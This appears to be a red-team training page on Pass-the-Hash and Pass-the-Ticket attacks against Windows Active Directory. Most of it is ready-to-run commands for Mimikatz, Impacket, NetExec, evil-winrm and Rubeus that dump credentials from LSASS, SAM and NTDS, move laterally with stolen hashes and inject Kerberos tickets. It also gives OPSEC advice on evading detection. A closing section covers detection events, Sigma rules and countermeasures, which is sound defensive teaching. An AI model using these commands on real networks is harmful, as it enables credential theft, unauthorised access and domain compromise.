---
layout: training-page
title: "Pass-the-Hash / Pass-the-Ticket — Red Team Academy"
module: "Active Directory"
tags:
  - pth
  - ptt
  - lateral-movement
  - ntlm
page_key: "ad-pass-the-hash"
render_with_liquid: false
---

# Pass-the-Hash / Pass-the-Ticket

## NTLM Authentication — Why Hashes Work

NTLM (NT LAN Manager) authentication never sends the plaintext password. Instead, it uses a challenge-response mechanism with the password hash. The server sends a challenge, the client encrypts it with the NTLM hash and sends it back. This means: **if you have the hash, you can authenticate** — without knowing the original password. This is Pass-the-Hash.

NTLM is still used everywhere in Windows environments: SMB, WMI, WinRM, RDP (NLA off), HTTP NTLM auth. Every time NTLM is used, a hash works in place of a password.

![Pass-the-Hash attack flow: dump NTLM hash from LSASS/SAM, use it to authenticate via SMB/WinRM/PSExec](/images/active-directory/pass-the-hash-flow.svg)  
*// pass-the-hash flow — no plaintext password needed for NTLM auth*

## Obtaining Hashes

```
# From LSASS memory (requires local admin, EDR will likely catch this):
# Mimikatz:
sekurlsa::logonpasswords    # All credentials in LSASS — NTLM hashes + cleartext if WDigest

# From SAM database (local accounts only):
secretsdump.py 'WORKGROUP/administrator:password@192.168.56.22' -sam

# From DCSync (domain accounts):
secretsdump.py 'north.sevenkingdoms.local/Administrator:password@192.168.56.10'
# Output format: username:RID:LM_HASH:NTLM_HASH:::

# From NTDS.dit (domain controller database):
secretsdump.py 'north.sevenkingdoms.local/Administrator:password@192.168.56.10' \
  -just-dc-ntlm

# Hash format: LM:NTLM
# LM is always aad3b435b51404eeaad3b435b51404ee (disabled)
# Use only the NTLM portion (right of colon) for PtH
```

## Pass-the-Hash — NetExec / CrackMapExec

NetExec (nxc) is the actively maintained successor to CrackMapExec. Both use identical syntax for PtH operations.

```
# Check access across subnet with hash (NetExec):
netexec smb 192.168.56.0/24 \
  -u 'administrator' \
  -H 'NTLM_HASH_HERE' \
  --local-auth

# Domain account PtH:
crackmapexec smb 192.168.56.0/24 \
  -u 'administrator' \
  -H 'NTLM_HASH_HERE' \
  -d 'north.sevenkingdoms.local'

# Execute command with hash:
crackmapexec smb 192.168.56.22 \
  -u 'hodor' \
  -H 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' \
  -x 'whoami'

# Dump SAM with hash:
crackmapexec smb 192.168.56.22 \
  -u 'administrator' \
  -H 'NTLM_HASH' \
  --local-auth \
  --sam

# Full hash format (some tools need LM:NTLM together):
# aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

## Pass-the-Hash — Impacket Tools

```
># psexec.py — get SYSTEM shell via SMB:
psexec.py -hashes ':NTLM_HASH' 'north.sevenkingdoms.local/administrator@192.168.56.10'

# wmiexec.py — WMI execution (semi-interactive, less noisy than psexec):
wmiexec.py -hashes ':NTLM_HASH' 'administrator@192.168.56.22'
wmiexec.py -hashes ':NTLM_HASH' 'NORTH/administrator@192.168.56.22'

# smbexec.py — SMB execution (creates a service):
smbexec.py -hashes ':NTLM_HASH' 'administrator@192.168.56.22'

# atexec.py — Task Scheduler execution:
atexec.py -hashes ':NTLM_HASH' 'administrator@192.168.56.22' 'whoami'

# secretsdump.py — dump credentials with hash:
secretsdump.py -hashes ':NTLM_HASH' 'NORTH/administrator@192.168.56.10'

# Format note: Impacket uses ':NTLM' (LM omitted or empty before colon)
# Full format: 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' also works
```

## Pass-the-Hash — evil-winrm

```
# evil-winrm connects via WinRM (TCP 5985/5986) with hash:
evil-winrm -i 192.168.56.22 -u administrator -H 'NTLM_HASH'
evil-winrm -i 192.168.56.22 -u 'north.sevenkingdoms.local\administrator' -H 'NTLM_HASH'

# Load PowerShell scripts on connect:
evil-winrm -i 192.168.56.22 -u administrator -H 'NTLM_HASH' \
  -s /opt/PowerSploit/Recon/

# Upload file:
evil-winrm> upload /local/path/file.exe C:\Windows\Temp\file.exe
```

## Overpass-the-Hash (Hash → TGT)

Overpass-the-Hash converts an NTLM hash into a Kerberos TGT. This is more powerful than PtH — you get a Kerberos ticket that works against services requiring Kerberos (like LDAP), and you operate as the user in a legitimate Kerberos context rather than falling back to NTLM.

```
# Rubeus — request TGT with NTLM hash:
Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /domain:north.sevenkingdoms.local /ptt

# /ptt — inject ticket directly into current session (Pass-the-Ticket after getting TGT)
# /nowrap — don't line-wrap base64 output
# /aes256 — use AES256 key if you have it (stealthier than RC4)

Rubeus.exe asktgt /user:administrator \
  /aes256:AES256_KEY \
  /domain:north.sevenkingdoms.local \
  /ptt \
  /nowrap

# Mimikatz:
sekurlsa::pth /user:administrator /domain:north.sevenkingdoms.local /ntlm:NTLM_HASH /run:cmd.exe
# Opens a new cmd.exe running as administrator with a Kerberos TGT
```

## Pass-the-Ticket (PtT)

Pass-the-Ticket injects an existing Kerberos ticket (TGT or TGS) into your current logon session. You can extract tickets from memory or create them from scratch (Golden/Silver Tickets). Useful for impersonating accounts, lateral movement, and persistence.

```
# Dump all tickets from memory (Windows):
Rubeus.exe dump /nowrap          # All tickets in current session
# Specific logon session — get the LUID first from `Rubeus.exe triage` or `klist sessions`:
Rubeus.exe dump /luid:0x3e7 /nowrap       # 0x3e7 = SYSTEM logon session

# List tickets in current session:
Rubeus.exe triage               # Summary of all tickets
klist                           # Built-in Windows command

# Extract a specific ticket to file:
Rubeus.exe dump /user:administrator /service:krbtgt /nowrap > admin_tgt.txt

# Inject ticket into current session:
Rubeus.exe ptt /ticket:BASE64_TICKET_HERE
# or from file:
Rubeus.exe ptt /ticket:ticket.kirbi

# Mimikatz — export ticket from memory:
kerberos::list /export           # Exports .kirbi files

# Mimikatz — inject ticket:
kerberos::ptt ticket.kirbi

# After PtT — verify ticket is loaded:
klist
# Use it — access shares, run lateral movement tools
```

## PtH vs PtT vs OPtH — When to Use What

| Technique | What You Need | Auth Protocol | Best For |
| --- | --- | --- | --- |
| Pass-the-Hash | NTLM hash | NTLM | SMB, WMI, WinRM lateral movement |
| Overpass-the-Hash | NTLM hash | Kerberos (via TGT) | Kerberos-required services, stealth |
| Pass-the-Ticket | TGT or TGS ticket | Kerberos | Impersonation, service access |
| Golden Ticket | krbtgt hash | Kerberos | Persistence, any domain user impersonation |

## Pass-the-Ticket from Linux — ccache Files and KRB5CCNAME

On Linux, Kerberos tickets are stored as ccache files. Setting the KRB5CCNAME environment variable tells Impacket (and other Kerberos-aware tools) which ccache to use for authentication. This is the Linux equivalent of injecting a ticket into a Windows logon session with Rubeus ptt.

```
# Kerberos tickets on Linux are .ccache files (credential cache)
# The KRB5CCNAME environment variable points to the active ccache

# Common ccache locations:
# /tmp/krb5cc_$(id -u)       — default location for current user
# /tmp/krb5cc_*              — any user's cached tickets
# ./Administrator.ccache     — tool output (getST.py, ticketer.py, getTGT.py)

# List tickets in a ccache file:
klist -c Administrator.ccache
# Or default ccache: klist

# Get a TGT from a password (to use with PtT workflows):
getTGT.py inlanefreight.local/administrator:Password123! -dc-ip 10.129.1.207
# Saves: administrator.ccache

# Get a TGT using NTLM hash (Overpass-the-Hash on Linux):
getTGT.py inlanefreight.local/administrator -hashes :NTLM_HASH -dc-ip 10.129.1.207

# Export a ccache and use it with Impacket tools:
export KRB5CCNAME=./Administrator.ccache
secretsdump.py -k -no-pass dc01.inlanefreight.local
psexec.py -k -no-pass inlanefreight.local/administrator@dc01.inlanefreight.local
wmiexec.py -k -no-pass inlanefreight.local/administrator@dc01.inlanefreight.local
smbclient.py -k -no-pass //dc01.inlanefreight.local/c$

# Unset when done (avoid using wrong ticket for next command):
unset KRB5CCNAME

# Copy a ccache from a compromised Linux host (if you have file access to /tmp):
# Find active ccaches:
ls -la /tmp/krb5cc_*
# Copy and use:
export KRB5CCNAME=/tmp/krb5cc_1001
klist  # verify whose ticket it is

# Pass-the-Ticket in memory using renewing the ticket:
# If a TGT is about to expire but still within renew time:
getTGT.py inlanefreight.local/administrator -hashes :NTLM_HASH
# getST.py can also refresh an existing TGT via S4U
```

## Sacrificial Process — Rubeus createnetonly (Windows OPSEC)

When injecting tickets on Windows, always create a sacrificial process with Rubeus createnetonly first. Writing a ticket directly into an existing session can overwrite the machine or service account's legitimate ticket, potentially crashing services or causing logon failures. Critically: if the machine account loses its TGT, services may break until reboot.

```
# Create a sacrificial logon session (new process with isolated credential space):
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# [+] ProcessID: 4288
# [+] LUID: 0xa4a39  ← use this LUID to target this session

# /show    — show the spawned process (otherwise hidden)
# No admin required to create the process; admin required to interact with LUID

# After creating the sacrificial process — inject ticket into it using /LUID:
.\Rubeus.exe ptt /ticket:BASE64_TICKET /luid:0xa4a39

# Or dump and renew in one step (safer than injecting directly):
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap
# Then renew the extracted TGT for a fresh copy:
.\Rubeus.exe renew /ticket:BASE64_EXTRACTED_TICKET /ptt

# Check all sessions and their tickets (triage = non-destructive read):
.\Rubeus.exe triage
# Lists LUID, UserName, Service (krbtgt = TGT), and expiry time

# Use the ticket in the sacrificial process via LUID targeting:
# (From the spawned cmd window — it uses the injected ticket automatically)
dir \\dc01.inlanefreight.local\c$

# Alternative without admin — use C2 framework maketoken:
# Cobalt Strike: maketoken DOMAIN\user password
# This creates a logon session via Windows API and avoids Rubeus admin requirement
```

## When PtH Fails — Protected Users Group

The **Protected Users** security group is a hardening mechanism introduced in Windows Server 2012 R2. Members cannot use NTLM authentication at all — they're forced to Kerberos. This completely blocks Pass-the-Hash for those accounts.

```
# Check if an account is in Protected Users:
Get-ADGroupMember "Protected Users" | Select Name, SamAccountName

# Check from Linux (with creds):
netexec ldap 172.16.5.5 -u jsmith -p 'Password123!' \
  -M get-desc-users  # and check via bloodhound "Protected Users" node

# What Protected Users enforces:
# - No NTLM authentication (PtH fails outright)
# - No DES or RC4 Kerberos (only AES)
# - No Kerberos delegation (constrained or unconstrained)
# - TGT lifetime capped at 4 hours (not renewable)
# - No credential caching

# If your PtH fails for a high-value account — check Protected Users first
# Workaround: you need the plaintext password OR an AES Kerberos key

# Extract AES keys from LSASS (Mimikatz):
sekurlsa::ekeys   # Shows AES128 and AES256 Kerberos keys alongside NTLM hashes

# Use AES key for OPtH with Rubeus:
Rubeus.exe asktgt /user:administrator /aes256:AES256_KEY /domain:corp.local /ptt
```

## Detection & OPSEC

- **Event ID 4624 Logon Type 3** — Network logon. PtH generates this. Source IP is your attacker machine.
- **Event ID 4625** — Failed logon. Multiple failures with NTLM = spray detection.
- **Event ID 4776** — NTLM credential validation. Anomalous source IPs for domain admin accounts trigger UEBA alerts.
- **Anomalous NTLM auth** — Modern EDR detects NTLM auth from unusual sources or for high-privilege accounts.
- **OPSEC:** Use OPtH instead of PtH when possible — Kerberos auth blends in better than NTLM in modern environments.
- **OPSEC:** For wmiexec vs psexec — wmiexec doesn't drop a service binary, making it less detectable than psexec's service-based approach.
- **OPSEC:** Use AES keys for OPtH instead of RC4/NTLM hashes where possible — AES Kerberos requests are less suspicious and bypass some detections tuned specifically for RC4 downgrade.

## Detection

### Event Log Sources
- **Event ID 4624 Logon Type 3** (Network Logon) — Every successful PtH generates a Type 3 logon on the target host. The `AuthenticationPackageName` field will be `NTLM` and the `LmPackageName` field will be `NTLM V2`. The `WorkstationName` and `IpAddress` fields show the attacker's source.
- **Event ID 4776** (NTLM Authentication) — Logged on the DC when NTLM auth is validated against the domain. Shows the source workstation and account name; anomalous source IPs for privileged accounts are high-signal.
- **Event ID 4625** (Failed Logon) — Failed PtH attempts with wrong hashes appear as Type 3 NTLM failures. Multiple failures from one source = spray or hash-testing activity.
- **Event ID 4648** (Logon with Explicit Credentials) — Generated when `sekurlsa::pth` or `Rubeus asktgt` is used to create a new logon session. The `SubjectUserName` (current user) differs from `TargetUserName` (injected user).
- **Event ID 4624 Logon Type 9** (NewCredentials) — Generated specifically by `sekurlsa::pth`; the user's existing session is preserved but new credentials are injected. A Type 9 logon from a non-interactive session is suspicious.

### Sysmon Events
- **Event ID 1 (Process Creation)** — `mimikatz.exe`, `Rubeus.exe`, `psexec.exe`, `wmiexec.py` (via child processes) with command lines containing `sekurlsa::pth`, `asktgt`, or `-hashes` flags.
- **Event ID 3 (Network Connection)** — Outbound connections from workstations to SMB (445), WinRM (5985), or WMI (135) on other hosts, especially from processes like `python.exe`, `wmiexec.py`, or unsigned executables.
- **Event ID 10 (ProcessAccess)** — LSASS access required to dump hashes that enable PtH (precursor activity).

### Key Indicators
- **Impossible travel / logon without interactive precursor** — a workstation authenticates to a second host via Type 3 NTLM but there is no preceding Type 2 (Interactive) or Type 10 (RDP) logon on the source — the user was never physically logged in
- **NTLM auth for accounts in the Protected Users group** — these accounts cannot use NTLM; any 4776 event for a Protected Users member is an anomaly (attacker has the hash but cannot use PtH — or the account was recently removed from the group)
- **Same NTLM hash used from multiple source IPs in a short window** — indicates hash reuse/spraying across systems
- **wmiexec / psexec patterns** — `wmiprvse.exe` spawning `cmd.exe` or PowerShell children is a WMI lateral movement indicator; `psexec` creates a service (Event 7045) with a random 6-character name
- **Type 3 logon from Linux-style hostnames** — Impacket tools send the attacker's Linux hostname as `WorkstationName`; lowercase hostnames or hostnames like `kali`, `parrot`, `attacker` in 4624 events are red flags

### Sigma Rule Concept
```yaml
# Sigma concept — Impossible logon: network auth without prior interactive logon
title: Pass-the-Hash Indicator — Network Logon Without Interactive Precursor
status: experimental
logsource:
    product: windows
    service: security
detection:
    network_logon:
        EventID: 4624
        LogonType: 3
        AuthenticationPackageName: 'NTLM'
    # Correlate: no EventID 4624 Type 2/10 from same SubjectUserSid on source host in last 8h
    # (Requires SIEM correlation, not pure Sigma)
    filter_computer_accounts:
        TargetUserName|endswith: '$'
    condition: network_logon and not filter_computer_accounts
falsepositives:
    - Scheduled tasks using network credentials
    - Service accounts performing network operations
    - Legacy applications with hardcoded credentials
level: medium

# Separate high-confidence rule:
title: NTLM Auth for High-Privilege Account from Unexpected Workstation
detection:
    selection:
        EventID: 4776
        TargetUserName|contains:
            - 'administrator'
            - 'admin'
            - 'svc'
    filter_known_sources:
        Workstation: 'ADMIN-WS01'   # replace with legitimate admin workstations
    condition: selection and not filter_known_sources
level: high
```

### EDR Behavior Alerts
- **Microsoft Defender for Identity (MDI)**: Native "Pass-the-Hash" alert — MDI correlates NTLM lateral movement patterns against the user's normal behavior baseline; alerts when a hash is used from a host the account has never logged into interactively
- **CrowdStrike Falcon**: "Credential-Based Lateral Movement" / "Pass-the-Hash" — detects LSASS dump followed by NTLM authentication from the same endpoint within a time window
- **SentinelOne**: "Lateral Movement — Pass-the-Hash" — behavioral alert correlating hash extraction (LSASS access) with subsequent remote NTLM authentication
- **Microsoft Defender for Endpoint**: "Suspicious NTLM authentication" alert when high-privilege accounts authenticate via NTLM from unexpected sources

### Defensive Countermeasures
- **Protected Users security group** — members cannot use NTLM; PtH is completely blocked for those accounts; add all privileged accounts
- **Credential Guard (VBS)** — isolates NTLM hashes and Kerberos TGTs in a hypervisor-protected enclave; LSASS dumps return empty even with SeDebugPrivilege
- **Disable NTLM** (or restrict to NTLMv2 only) — Group Policy: Network security: LAN Manager authentication level → "Send NTLMv2 response only, refuse LM & NTLM"
- **Local Administrator Password Solution (LAPS)** — unique, rotating local admin passwords per workstation prevent lateral movement using a single local admin hash
- **Network segmentation / firewall** — block SMB (445), WMI (135), and WinRM (5985) between workstations; admin traffic should only flow from jump hosts
- **Tiered administration model** — Tier 0 (DC) credentials never used on Tier 1 (servers) or Tier 2 (workstations); prevents hash capture on lower-tier systems from enabling higher-tier access

## Key Resources

- `https://github.com/GhostPack/Rubeus` — Rubeus Kerberos toolkit
- `https://github.com/Hackplayers/evil-winrm` — evil-winrm
- `https://github.com/SecureAuthCorp/impacket` — Impacket tools
- `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash` — HackTricks PtH guide
